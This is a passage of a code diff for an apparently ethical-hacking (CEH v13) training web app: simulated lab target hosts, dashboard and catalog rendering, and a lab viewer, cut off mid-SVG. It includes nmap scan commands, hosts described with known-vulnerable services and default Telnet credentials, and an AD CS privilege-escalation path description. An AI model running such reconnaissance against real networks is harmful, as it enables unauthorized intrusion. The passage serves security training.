+        ports: "21 (vsftpd 2.3.4), 80 (Apache 2.4.52), 445 (Samba 4.15), 3306 (MySQL 8.0)",
+        os: "Ubuntu 22.04 LTS (Apache/PHP/MySQL)",
+        status: "VULNERABLE",
+        color: "amber",
+        relatedLab: "lab-05",
+        scanCmd: "nmap -sS -sV -p 21,80,445,3306 10.10.20.50"
+      },
+      {
+        ip: "10.10.20.80",
+        name: "IoT-SensorNode-01",
+        role: "Industrial SCADA & IoT Telemetry",
+        ports: "23 (Telnet admin:admin), 1883 (MQTT Insecure), 8883 (MQTTS)",
+        os: "Embedded BusyBox Linux 1.34",
+        status: "IOT TARGET",
+        color: "rose",
+        relatedLab: "lab-18",
+        scanCmd: "nmap -sS -p 23,1883,8883 10.10.20.80"
+      },
+      {
+        ip: "10.10.20.100",
+        name: "AP-Corp-WPA3",
+        role: "Enterprise Wireless Access Point",
+        ports: "80 (Admin WebUI), 802.11ax Beacon (Channel 6)",
+        os: "OpenWrt 22.03 / hostapd",
+        status: "WIRELESS",
+        color: "cyan",
+        relatedLab: "lab-16",
+        scanCmd: "iwconfig"
+      }
+    ];
+
+    // --- Load Datasets & Initialize ---
+    async function initCEHPlatform() {
+      // 1. Check if backend API is online
+      try {
+        const healthRes = await fetch('/api/health');
+        if (healthRes.ok) {
+          const healthData = await healthRes.json();
+          CEHState.isBackendOnline = true;
+          document.getElementById('backend-status-dot').className = 'w-2 h-2 rounded-full bg-cyber-emerald';
+          document.getElementById('backend-status-text').textContent = 'Sync: SQLite Online';
+        }
+      } catch (e) {
+        CEHState.isBackendOnline = false;
+        document.getElementById('backend-status-dot').className = 'w-2 h-2 rounded-full bg-amber-400';
+        document.getElementById('backend-status-text').textContent = 'Sync: LocalStorage';
+      }
+
+      // 2. Fetch or load JSON data
+      try {
+        if (CEHState.isBackendOnline) {
+          const [mRes, lRes, qRes, pRes, nRes, bRes, fRes, fcRes] = await Promise.all([
+            fetch('/api/modules').then(r => r.json()),
+            fetch('/api/labs').then(r => r.json()),
+            fetch('/api/quizzes').then(r => r.json()),
+            fetch('/api/progress').then(r => r.json()).catch(() => ({ progress: [] })),
+            fetch('/api/notes').then(r => r.json()).catch(() => ({ notes: {} })),
+            fetch('/api/bookmarks').then(r => r.json()).catch(() => ({ bookmarks: [] })),
+            fetch('/api/flags').then(r => r.json()).catch(() => ({ flags: {} })),
+            fetch('/api/flashcards').then(r => r.json()).catch(() => ({ flashcards: {} }))
+          ]);
+          CEHState.modules = mRes;
+          CEHState.labs = lRes;
+          CEHState.quizzes = qRes.quizzes || [];
+          
+          // Hydrate progress from SQLite
+          if (pRes && Array.isArray(pRes.progress)) {
+            pRes.progress.forEach(p => {
+              CEHState.progress[p.lab_id] = {
+                completedSteps: JSON.parse(p.completed_steps || '[]'),
+                completedChecklist: JSON.parse(p.completed_checklist || '[]'),
+                isCompleted: !!p.is_completed
+              };
+            });
+          }
+          if (nRes && nRes.notes) CEHState.notes = nRes.notes;
+          if (bRes && bRes.bookmarks) CEHState.bookmarks = bRes.bookmarks;
+          if (fRes && fRes.flags) {
+            Object.entries(fRes.flags).forEach(([lid, obj]) => {
+              CEHState.flags[lid] = obj.flag;
+            });
+          }
+          if (fcRes && fcRes.flashcards) {
+            Object.entries(fcRes.flashcards).forEach(([cid, obj]) => {
+              CEHState.flashcards[cid] = obj.status;
+            });
+          }
+        } else {
+          // Fallback to local JSON files or window variables
+          const [mRes, lRes, qRes] = await Promise.all([
+            fetch('ceh_data/modules.json').then(r => r.json()),
+            fetch('ceh_data/labs.json').then(r => r.json()),
+            fetch('ceh_data/quizzes.json').then(r => r.json())
+          ]);
+          CEHState.modules = mRes;
+          CEHState.labs = lRes;
+          CEHState.quizzes = qRes.quizzes || [];
+          loadFromLocalStorage();
+        }
+      } catch (err) {
+        console.warn('Network fetch error or file:// origin, hydrating offline fallback data...', err);
+        if (window.OFFLINE_CEH_MODULES) {
+          CEHState.modules = window.OFFLINE_CEH_MODULES;
+          CEHState.labs = window.OFFLINE_CEH_LABS;
+          CEHState.quizzes = window.OFFLINE_CEH_QUIZZES;
+        }
+        loadFromLocalStorage();
+      }
+
+      if (!CEHState.modules || CEHState.modules.length === 0) {
+        if (window.OFFLINE_CEH_MODULES) {
+          CEHState.modules = window.OFFLINE_CEH_MODULES;
+          CEHState.labs = window.OFFLINE_CEH_LABS;
+          CEHState.quizzes = window.OFFLINE_CEH_QUIZZES;
+        }
+      }
+
+      // Initialize UI
+      renderSidebar();
+      renderCurrentView();
+    }
+
+    function loadFromLocalStorage() {
+      try {
+        const savedProgress = localStorage.getItem('ceh_v13_progress');
+        if (savedProgress) CEHState.progress = JSON.parse(savedProgress);
+        const savedNotes = localStorage.getItem('ceh_v13_notes');
+        if (savedNotes) CEHState.notes = JSON.parse(savedNotes);
+        const savedBookmarks = localStorage.getItem('ceh_v13_bookmarks');
+        if (savedBookmarks) CEHState.bookmarks = JSON.parse(savedBookmarks);
+        const savedQuizzes = localStorage.getItem('ceh_v13_quizzes');
+        if (savedQuizzes) CEHState.quizScores = JSON.parse(savedQuizzes);
+        const savedFlags = localStorage.getItem('ceh_v13_flags');
+        if (savedFlags) CEHState.flags = JSON.parse(savedFlags);
+        const savedFlashcards = localStorage.getItem('ceh_v13_flashcards');
+        if (savedFlashcards) CEHState.flashcards = JSON.parse(savedFlashcards);
+        const savedActiveLab = localStorage.getItem('ceh_v13_active_lab');
+        if (savedActiveLab) CEHState.activeLabId = savedActiveLab;
+      } catch (e) {
+        console.error('LocalStorage parse error', e);
+      }
+    }
+
+    function saveState() {
+      // Save to localStorage always as resilience
+      localStorage.setItem('ceh_v13_progress', JSON.stringify(CEHState.progress));
+      localStorage.setItem('ceh_v13_notes', JSON.stringify(CEHState.notes));
+      localStorage.setItem('ceh_v13_bookmarks', JSON.stringify(CEHState.bookmarks));
+      localStorage.setItem('ceh_v13_quizzes', JSON.stringify(CEHState.quizScores));
+      localStorage.setItem('ceh_v13_flags', JSON.stringify(CEHState.flags));
+      localStorage.setItem('ceh_v13_flashcards', JSON.stringify(CEHState.flashcards));
+      if (CEHState.activeLabId) localStorage.setItem('ceh_v13_active_lab', CEHState.activeLabId);
+      
+      // Update sidebar counter
+      const completedCount = Object.values(CEHState.progress).filter(p => p.isCompleted).length;
+      const countEl = document.getElementById('sidebar-completed-count');
+      if (countEl) countEl.textContent = `${completedCount}/${CEHState.labs.length}`;
+    }
+
+    // --- Navigation ---
+    function navigate(view, labId) {
+      AudioEngine.click();
+      CEHState.activeView = view;
+      if (labId) {
+        CEHState.activeLabId = labId;
+        saveState();
+      }
+
+      // Update Nav Buttons
+      ['dashboard', 'modules', 'report', 'terminal', 'exam', 'cheatsheets', 'flashcards'].forEach(tab => {
+        const btn = document.getElementById(`nav-btn-${tab}`);
+        if (btn) {
+          if (CEHState.activeView === tab) {
+            btn.className = 'px-3 py-2 rounded-lg transition font-bold text-white bg-charcoal-800';
+          } else {
+            btn.className = 'px-3 py-2 rounded-lg transition text-slate-400 hover:text-white hover:bg-charcoal-800';
+          }
+        }
+      });
+
+      renderSidebar();
+      renderCurrentView();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function renderCurrentView() {
+      const container = document.getElementById('main-content');
+      if (!container) return;
+
+      if (CEHState.activeView === 'dashboard') {
+        container.innerHTML = renderDashboardView();
+      } else if (CEHState.activeView === 'modules') {
+        container.innerHTML = renderModulesCatalogView();
+      } else if (CEHState.activeView === 'lab') {
+        container.innerHTML = renderLabView();
+      } else if (CEHState.activeView === 'cheatsheets') {
+        container.innerHTML = renderCheatsheetsView();
+      } else if (CEHState.activeView === 'flashcards') {
+        container.innerHTML = renderFlashcardsView();
+      } else if (CEHState.activeView === 'terminal') {
+        container.innerHTML = renderFullTerminalView();
+      } else if (CEHState.activeView === 'exam') {
+        container.innerHTML = renderMockExamView();
+      } else if (CEHState.activeView === 'report') {
+        container.innerHTML = renderReportView();
+      }
+    }
+
+    // --- VIEW 1: DASHBOARD ---
+    function renderDashboardView() {
+      const totalLabs = CEHState.labs.length || 21;
+      const completedLabs = Object.values(CEHState.progress).filter(p => p.isCompleted).length;
+      const readinessPct = Math.round((completedLabs / totalLabs) * 100);
+      const passedQuizzes = Object.values(CEHState.quizScores).filter(q => q.passed).length;
+      const activeLab = CEHState.labs.find(l => l.id === CEHState.activeLabId) || CEHState.labs[0];
+
+      return `
+        <div class="space-y-6">
+          
+          <!-- Top Hero Card -->
+          <div class="bg-gradient-to-r from-charcoal-900 via-charcoal-850 to-charcoal-900 p-6 sm:p-8 rounded-2xl border border-charcoal-700/80 shadow-xl relative overflow-hidden">
+            <div class="absolute -right-10 -bottom-10 w-64 h-64 bg-cyber-cyan/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
+              <div class="space-y-2">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyber-emerald/10 border border-cyber-emerald/30 text-cyber-emerald font-mono text-xs font-bold">
+                  <span>🛡️</span> <span>CEH v13 Practical Readiness Dashboard</span>
+                </div>
+                <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white tracking-tight">Certified Ethical Hacker Practical Enclave</h1>
+                <p class="text-xs sm:text-sm font-mono text-slate-400 max-w-2xl leading-relaxed">
+                  Interactive hands-on training platform covering all 20 examination modules plus advanced Active Directory Certificate Services (AD CS) privilege escalation and remediation.
+                </p>
+              </div>
+
+              <!-- Quick Resume Button -->
+              <div class="flex flex-col gap-2 shrink-0">
+                <button onclick="navigate('lab', '${activeLab.id}')" class="px-5 py-3 rounded-xl bg-gradient-to-r from-cyber-cyan to-cyber-emerald hover:from-cyan-400 hover:to-emerald-400 text-black font-mono font-bold text-xs shadow-lg glow-cyan flex items-center justify-center gap-2 transition transform hover:scale-[1.02]">
+                  <span>⚡ Resume Current Lab: ${activeLab.moduleNumber}</span>
+                </button>
+                <div class="text-[11px] font-mono text-slate-500 text-center">
+                  Last active: <span class="text-slate-300 font-bold">${escapeHtml(activeLab.title.substring(0, 28))}...</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Readiness & Metrics Grid -->
+          <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+            
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-2">
+              <div class="flex items-center justify-between text-xs font-mono text-slate-400">
+                <span>Readiness Score</span>
+                <span class="text-cyber-cyan font-bold">${readinessPct}%</span>
+              </div>
+              <div class="text-2xl font-mono font-bold text-white">${readinessPct}%</div>
+              <div class="w-full bg-charcoal-800 rounded-full h-1.5 overflow-hidden">
+                <div class="bg-gradient-to-r from-cyber-cyan to-cyber-emerald h-1.5 rounded-full transition-all duration-500" style="width: ${readinessPct}%"></div>
+              </div>
+            </div>
+
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-2">
+              <div class="flex items-center justify-between text-xs font-mono text-slate-400">
+                <span>Labs Completed</span>
+                <span class="text-cyber-emerald font-bold">${completedLabs}/${totalLabs}</span>
+              </div>
+              <div class="text-2xl font-mono font-bold text-white">${completedLabs} <span class="text-xs font-mono text-slate-500">/ ${totalLabs}</span></div>
+              <p class="text-[10px] font-mono text-slate-500">All 20 core topics + AD CS</p>
+            </div>
+
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-2">
+              <div class="flex items-center justify-between text-xs font-mono text-slate-400">
+                <span>Quizzes Passed</span>
+                <span class="text-cyber-amber font-bold">${passedQuizzes}/${CEHState.quizzes.length || 21}</span>
+              </div>
+              <div class="text-2xl font-mono font-bold text-white">${passedQuizzes} <span class="text-xs font-mono text-slate-500">Passed</span></div>
+              <p class="text-[10px] font-mono text-slate-500">&gt;= 70% passing threshold</p>
+            </div>
+
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-2">
+              <div class="flex items-center justify-between text-xs font-mono text-slate-400">
+                <span>Target Enclave</span>
+                <span class="text-cyber-emerald font-bold">ONLINE</span>
+              </div>
+              <div class="text-2xl font-mono font-bold text-white">10.10.20.0<span class="text-xs font-mono text-slate-500">/24</span></div>
+              <p class="text-[10px] font-mono text-slate-500">Isolated Virtual Training Scope</p>
+            </div>
+
+          </div>
+
+          <!-- Interactive Subnet Explorer (10.10.20.0/24) -->
+          <div class="bg-charcoal-900 p-6 rounded-2xl border border-charcoal-800 space-y-4">
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 border-b border-charcoal-800 pb-3">
+              <div class="flex items-center gap-2">
+                <span class="text-base">🌐</span>
+                <div>
+                  <h3 class="text-sm font-mono font-bold text-white uppercase tracking-wider">Authorized Enclave Network Subnet Map</h3>
+                  <p class="text-[11px] font-mono text-slate-400">Subnet: <span class="text-cyber-emerald font-bold">10.10.20.0/24</span> | 6 Simulated Target Hosts Available</p>
+                </div>
+              </div>
+              <div class="flex items-center gap-2">
+                <button onclick="autoTypeCommand('nmap -sn 10.10.20.0/24')" class="px-3 py-1.5 rounded-lg bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs font-mono text-cyber-cyan transition flex items-center gap-1.5">
+                  <span>⚡ Ping Sweep Subnet</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Interactive Host Nodes Grid -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 font-mono">
+              ${SUBNET_HOSTS.map(host => renderSubnetHostCard(host)).join('')}
+            </div>
+          </div>
+
+          <!-- Featured: Advanced AD CS Master Lab Banner -->
+          <div class="p-6 rounded-2xl bg-gradient-to-br from-purple-950/40 via-charcoal-900 to-charcoal-900 border border-purple-500/40 shadow-xl flex flex-col md:flex-row items-stretch md:items-center justify-between gap-6">
+            <div class="space-y-2">
+              <div class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-purple-500/20 text-purple-300 font-mono text-[10px] font-bold border border-purple-500/30">
+                <span>👑 ADVANCED SPECIALIZATION</span>
+              </div>
+              <h2 class="text-lg sm:text-xl font-bold font-mono text-white">Active Directory &amp; AD CS Master Lab (ESC1 &amp; ESC8 Auditing)</h2>
+              <p class="text-xs font-mono text-slate-400 max-w-2xl leading-relaxed">
+                Step-by-step enterprise PKI security: Windows Server Domain Controller setup, Certificate Templates auditing, ESC1 SAN misconfiguration detection, Web Enrollment NTLM relay mitigation, and PowerShell remediation.
+              </p>
+            </div>
+            <button onclick="navigate('lab', 'lab-adcs')" class="px-5 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-mono font-bold text-xs shrink-0 transition shadow glow-purple flex items-center justify-center gap-2">
+              <span>Launch AD CS Master Lab ➔</span>
+            </button>
+          </div>
+
+          <!-- Quick Access Curriculum Catalog -->
+          <div class="space-y-4">
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4">
+              <div>
+                <h3 class="text-lg font-mono font-bold text-white">CEH v13 Practical Modules (1–20)</h3>
+                <p class="text-xs font-mono text-slate-400">Click any module card to enter the hands-on lab room.</p>
+              </div>
+              <button onclick="navigate('modules')" class="text-xs font-mono text-cyber-cyan hover:underline flex items-center gap-1 font-bold">
+                View Full Catalog &amp; Filter ➔
+              </button>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
+              ${CEHState.modules.slice(0, 6).map(m => renderModuleCard(m)).join('')}
+            </div>
+          </div>
+
+        </div>
+      `;
+    }
+
+    function renderSubnetHostCard(host) {
+      let badgeColor = 'text-emerald-400 bg-emerald-950/40 border-emerald-500/30';
+      if (host.color === 'purple') badgeColor = 'text-purple-300 bg-purple-950/40 border-purple-500/30';
+      if (host.color === 'amber') badgeColor = 'text-amber-300 bg-amber-950/40 border-amber-500/30';
+      if (host.color === 'rose') badgeColor = 'text-rose-300 bg-rose-950/40 border-rose-500/30';
+
+      return `
+        <div class="bg-charcoal-850 border border-charcoal-700/80 hover:border-cyber-cyan/50 rounded-xl p-4 space-y-2.5 transition flex flex-col justify-between">
+          <div class="space-y-1.5">
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-bold text-white flex items-center gap-1.5">
+                <span class="w-2 h-2 rounded-full ${host.color === 'purple' ? 'bg-purple-400' : host.color === 'amber' ? 'bg-amber-400' : host.color === 'rose' ? 'bg-rose-400' : 'bg-cyber-emerald'} animate-pulse"></span>
+                <span>${host.ip}</span>
+              </span>
+              <span class="px-2 py-0.5 rounded text-[9px] font-bold border ${badgeColor}">${host.status}</span>
+            </div>
+            <div class="text-xs font-bold text-slate-300 truncate">${escapeHtml(host.name)}</div>
+            <p class="text-[11px] text-slate-400 leading-tight">${escapeHtml(host.role)}</p>
+          </div>
+
+          <div class="pt-2 border-t border-charcoal-700/50 space-y-1 text-[10px] text-slate-400">
+            <div><strong class="text-slate-300">Ports:</strong> ${escapeHtml(host.ports)}</div>
+            <div><strong class="text-slate-300">OS:</strong> ${escapeHtml(host.os)}</div>
+          </div>
+
+          <div class="pt-2 border-t border-charcoal-700/50 flex items-center justify-between gap-1">
+            <button onclick="autoTypeCommand('${escapeHtml(host.scanCmd)}')" class="px-2.5 py-1 rounded bg-charcoal-900 hover:bg-cyber-cyan hover:text-black text-slate-300 text-[10px] font-bold transition flex items-center gap-1">
+              <span>⚡ Probe</span>
+            </button>
+            <button onclick="navigate('lab', '${host.relatedLab}')" class="px-2.5 py-1 rounded bg-charcoal-800 hover:bg-charcoal-700 text-white text-[10px] font-bold transition">
+              Go to Lab ➔
+            </button>
+          </div>
+        </div>
+      `;
+    }
+
+    // --- VIEW 2: MODULES CATALOG ---
+    function renderModulesCatalogView() {
+      const categories = ['All', 'Fundamentals', 'Reconnaissance', 'System Hacking', 'Network Defense', 'Web Security', 'Wireless Security', 'Mobile Security', 'IoT & OT Security', 'Cloud Security', 'Cryptography', 'Enterprise Identity'];
+      
+      const filteredModules = CEHState.modules.filter(m => {
+        const lab = CEHState.labs.find(l => l.id === m.labId) || {};
+        const matchesCategory = CEHState.activeModuleFilter === 'All' || lab.category === CEHState.activeModuleFilter;
+        const matchesDifficulty = CEHState.activeDifficultyFilter === 'All' || lab.difficulty === CEHState.activeDifficultyFilter;
+        const q = (CEHState.searchQuery || '').toLowerCase().trim();
+        const stepsMatch = (lab.steps || []).some(s => (s.command || '').toLowerCase().includes(q) || (s.title || '').toLowerCase().includes(q) || (s.explanation || '').toLowerCase().includes(q));
+        const objectivesMatch = (lab.learningObjectives || []).some(o => o.toLowerCase().includes(q));
+        const matchesSearch = !q || m.title.toLowerCase().includes(q) || m.description.toLowerCase().includes(q) || (lab.category && lab.category.toLowerCase().includes(q)) || stepsMatch || objectivesMatch;
+        return matchesCategory && matchesDifficulty && matchesSearch;
+      });
+
+      return `
+        <div class="space-y-6">
+          <div>
+            <h1 class="text-2xl font-mono font-bold text-white mb-1">CEH v13 Modules &amp; Practical Labs</h1>
+            <p class="text-xs font-mono text-slate-400">Complete curriculum mapped directly to Certified Ethical Hacker examination domains.</p>
+          </div>
+
+          <!-- Search & Filter Ribbon -->
+          <div class="bg-charcoal-900 p-4 rounded-xl border border-charcoal-800 space-y-3">
+            <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-3">
+              <div class="flex-1 relative">
+                <input type="text" value="${escapeHtml(CEHState.searchQuery)}" oninput="handleCatalogSearch(event)" placeholder="Search modules, tools, commands, or attack techniques..." class="w-full px-3 py-2 bg-charcoal-850 border border-charcoal-700 rounded-lg text-xs font-mono text-white placeholder-slate-500 focus:outline-none focus:border-cyber-cyan transition">
+                <span class="absolute right-2.5 top-2.5 text-xs text-slate-500">🔍</span>
+              </div>
+              <div class="flex items-center gap-2">
+                <span class="text-xs font-mono text-slate-400">Difficulty:</span>
+                <select onchange="handleDifficultyFilter(event)" class="bg-charcoal-850 border border-charcoal-700 text-xs font-mono text-slate-200 rounded px-3 py-2 focus:outline-none">
+                  ${['All', 'Beginner', 'Intermediate', 'Advanced'].map(d => `
+                    <option value="${d}" ${CEHState.activeDifficultyFilter === d ? 'selected' : ''}>${d}</option>
+                  `).join('')}
+                </select>
+              </div>
+            </div>
+
+            <!-- Category Pills -->
+            <div class="flex items-center gap-1.5 overflow-x-auto pb-1">
+              ${categories.map(cat => `
+                <button onclick="handleCategoryFilter('${cat}')" class="px-2.5 py-1 rounded text-xs font-mono whitespace-nowrap transition ${CEHState.activeModuleFilter === cat ? 'bg-cyber-cyan text-black font-bold shadow' : 'bg-charcoal-800 text-slate-400 hover:text-white'}">
+                  ${cat}
+                </button>
+              `).join('')}
+            </div>
+          </div>
+
+          <!-- Modules Grid -->
+          <div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
+            ${filteredModules.map(m => renderModuleCard(m)).join('')}
+          </div>
+
+          ${filteredModules.length === 0 ? `
+            <div class="p-12 text-center bg-charcoal-900 rounded-xl border border-charcoal-800 font-mono text-slate-500 space-y-2">
+              <div class="text-3xl">🔍</div>
+              <p>No modules match your current search and filter criteria.</p>
+              <button onclick="resetFilters()" class="text-xs text-cyber-cyan hover:underline font-bold">Clear All Filters</button>
+            </div>
+          ` : ''}
+        </div>
+      `;
+    }
+
+    function renderModuleCard(m) {
+      const lab = CEHState.labs.find(l => l.id === m.labId) || {};
+      const labProgress = CEHState.progress[m.labId] || {};
+      const isCompleted = labProgress.isCompleted;
+      const isBookmarked = CEHState.bookmarks.includes(m.labId);
+
+      let diffColor = 'text-cyber-emerald border-cyber-emerald/30 bg-cyber-emerald/10';
+      if (lab.difficulty === 'Intermediate') diffColor = 'text-cyber-cyan border-cyber-cyan/30 bg-cyber-cyan/10';
+      if (lab.difficulty === 'Advanced') diffColor = 'text-purple-400 border-purple-400/30 bg-purple-400/10';
+
+      return `
+        <div class="bg-charcoal-900 rounded-xl border border-charcoal-800 p-5 flex flex-col justify-between hover:border-charcoal-700 transition space-y-4 group">
+          <div class="space-y-3">
+            <div class="flex items-start justify-between gap-2">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded text-xs font-mono font-bold bg-charcoal-800 text-slate-300 border border-charcoal-700">M${m.number}</span>
+                <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${diffColor}">${lab.difficulty || 'Intermediate'}</span>
+              </div>
+              <button onclick="toggleBookmark('${m.labId}', event)" class="text-slate-500 hover:text-cyber-amber transition" title="Toggle Bookmark">
+                ${isBookmarked ? '⭐' : '☆'}
+              </button>
+            </div>
+
+            <div>
+              <h4 class="font-mono font-bold text-white text-sm group-hover:text-cyber-cyan transition line-clamp-1">${escapeHtml(m.title)}</h4>
+              <p class="text-slate-400 font-mono text-xs mt-1 line-clamp-2 leading-relaxed">${escapeHtml(m.description)}</p>
+            </div>
+          </div>
+
+          <div class="pt-3 border-t border-charcoal-800/80 flex items-center justify-between">
+            <div class="text-[11px] font-mono text-slate-500 flex items-center gap-1.5">
+              <span>⏱️</span> <span>${lab.estimatedTime || '40 mins'}</span>
+              <span>•</span>
+              <span class="${isCompleted ? 'text-cyber-emerald font-bold' : 'text-slate-400'}">${isCompleted ? '✔ COMPLETED' : 'PENDING'}</span>
+            </div>
+            <button onclick="navigate('lab', '${m.labId}')" class="px-3 py-1.5 rounded-lg bg-charcoal-800 group-hover:bg-cyber-cyan group-hover:text-black font-mono font-bold text-xs transition">
+              Launch Lab ➔
+            </button>
+          </div>
+        </div>
+      `;
+    }
+
+    // --- VIEW 3: LAB VIEWER ---
+    function renderLabView() {
+      const lab = CEHState.labs.find(l => l.id === CEHState.activeLabId) || CEHState.labs[0];
+      const mod = CEHState.modules.find(m => m.id === lab.moduleId) || CEHState.modules[0];
+      const labProg = CEHState.progress[lab.id] || { completedSteps: [], completedChecklist: [], isCompleted: false };
+      const noteContent = CEHState.notes[lab.id] || '';
+      const isBookmarked = CEHState.bookmarks.includes(lab.id);
+      const quiz = CEHState.quizzes.find(q => q.moduleId === lab.moduleId);
+      const isFlagVerified = !!CEHState.flags[lab.id];
+
+      return `
+        <div class="space-y-6">
+          
+          <!-- Breadcrumb & Top Controls -->
+          <div class="flex flex-wrap items-center justify-between gap-4 border-b border-charcoal-800 pb-4">
+            <div class="flex items-center gap-2 text-xs font-mono text-slate-400">
+              <button onclick="navigate('dashboard')" class="hover:text-white">Dashboard</button>
+              <span>/</span>
+              <button onclick="navigate('modules')" class="hover:text-white">Modules</button>
+              <span>/</span>
+              <span class="text-white font-bold">Module ${lab.moduleNumber}: ${escapeHtml(lab.title)}</span>
+            </div>
+
+            <div class="flex items-center gap-2">
+              <button onclick="toggleBookmark('${lab.id}')" class="px-3 py-1.5 rounded-lg bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 font-mono text-xs text-slate-300 transition flex items-center gap-1.5">
+                <span>${isBookmarked ? '⭐ Bookmarked' : '☆ Bookmark'}</span>
+              </button>
+              <button onclick="resetLabProgress('${lab.id}')" class="px-3 py-1.5 rounded-lg bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 font-mono text-xs text-rose-400 transition">
+                Reset Lab
+              </button>
+              <button onclick="toggleLabComplete('${lab.id}')" class="px-3 py-1.5 rounded-lg ${labProg.isCompleted ? 'bg-cyber-emerald text-black font-bold' : 'bg-charcoal-800 hover:bg-charcoal-700 text-white'} font-mono text-xs transition flex items-center gap-1.5">
+                <span>${labProg.isCompleted ? '✔ Lab Completed' : 'Mark Complete'}</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Lab Header Hero -->
+          <div class="bg-charcoal-900 p-6 rounded-2xl border border-charcoal-800 space-y-4">
+            <div class="flex flex-wrap items-center gap-2">
+              <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold bg-charcoal-800 text-cyber-cyan border border-charcoal-700">Module ${lab.moduleNumber}</span>
+              <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold bg-charcoal-800 text-slate-300 border border-charcoal-700">${lab.difficulty}</span>
+              <span class="px-2.5 py-0.5 rounded text-xs font-mono text-slate-400 border border-charcoal-700">⏱️ ${lab.estimatedTime}</span>
+              <span class="px-2.5 py-0.5 rounded text-xs font-mono text-purple-300 bg-purple-950/40 border border-purple-500/30">${lab.category}</span>
+            </div>
+
+            <h1 class="text-xl sm:text-2xl font-mono font-bold text-white">${escapeHtml(lab.title)}</h1>
+
+            <!-- Learning Objectives List -->
+            <div class="space-y-1.5 pt-2">
+              <div class="text-xs font-mono font-bold text-slate-400 uppercase tracking-wider">Learning Objectives:</div>
+              <ul class="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs font-mono text-slate-300">
+                ${lab.learningObjectives.map(obj => `
+                  <li class="flex items-start gap-2">
+                    <span class="text-cyber-emerald font-bold mt-0.5">✔</span>
+                    <span>${escapeHtml(obj)}</span>
+                  </li>
+                `).join('')}
+              </ul>
+            </div>
+          </div>
+
+          <!-- Topology & Environment Setup Card -->
+          <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
+            <div class="lg:col-span-2 bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-3">
+              <div class="flex items-center justify-between border-b border-charcoal-800 pb-2">
+                <span class="text-xs font-mono font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
+                  <span>🌐</span> <span>Lab Network Topology (Isolated Enclave)</span>
+                </span>
+                <span class="text-[11px] font-mono text-cyber-emerald">Subnet: 10.10.20.0/24</span>
+              </div>
+              <div class="grid grid-cols-2 sm:grid-cols-3 gap-2.5 text-xs font-mono">
+                ${Object.entries(lab.topology || {}).map(([key, val]) => `
+                  <div class="bg-charcoal-850 p-2.5 rounded-lg border border-charcoal-700/60">
+                    <span class="text-[10px] text-slate-500 block uppercase">${key}</span>
+                    <span class="text-slate-200 font-bold block mt-0.5 truncate">${escapeHtml(val)}</span>
+                  </div>
+                `).join('')}
+              </div>
+            </div>
+
+            <div class="bg-charcoal-900 p-5 rounded-xl border border-charcoal-800 space-y-2 text-xs font-mono">
+              <div class="text-xs font-bold text-slate-400 uppercase tracking-wider border-b border-charcoal-800 pb-2">Prerequisites &amp; Software</div>
+              <p class="text-slate-300 leading-relaxed">${escapeHtml(lab.requiredSoftware)}</p>
+              <div class="pt-2 text-[11px] text-slate-400 leading-relaxed border-t border-charcoal-800">
+                ${escapeHtml(lab.setupInstructions)}
+              </div>
+            </div>
+          </div>
+
+          <!-- Visual Active Directory Attack Path Graph (ESC1 Vector) -->
+          ${lab.id === 'lab-adcs' ? `
+            <div class="bg-charcoal-900 p-6 rounded-2xl border border-purple-500/40 space-y-4 shadow-xl">
+              <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-2 border-b border-charcoal-800 pb-3">
+                <div class="flex items-center gap-2">
+                  <span class="text-base">⚔️</span>
+                  <span class="text-white font-mono font-bold text-sm">BloodHound-Style AD CS Attack Path Graph (ESC1 Domain Takeover)</span>
+                </div>
+                <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-purple-500/20 text-purple-300 border border-purple-500/30">Target Forest: CORP.LOCAL</span>
+              </div>
+              <p class="text-xs font-mono text-slate-400">
+                Visualizing how an unprivileged domain user exploits the WebServer-Custom template to escalate directly to Domain Administrator. Click any node to inspect telemetry.
+              </p>
+              
+              <!-- Interactive SVG Graph -->
+              <div class="bg-charcoal-950 p-4 rounded-xl border border-charcoal-800 overflow-x-auto">
+                <svg viewBox="0 0 850 170" class="w-full min-w-[750px] h-44 select-none font-mono">
+                  <defs>
+                    <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                      <path d="M 0 0 L 10 5 L 0 10 z" fill="#8b5cf6" />
+                    </marker>
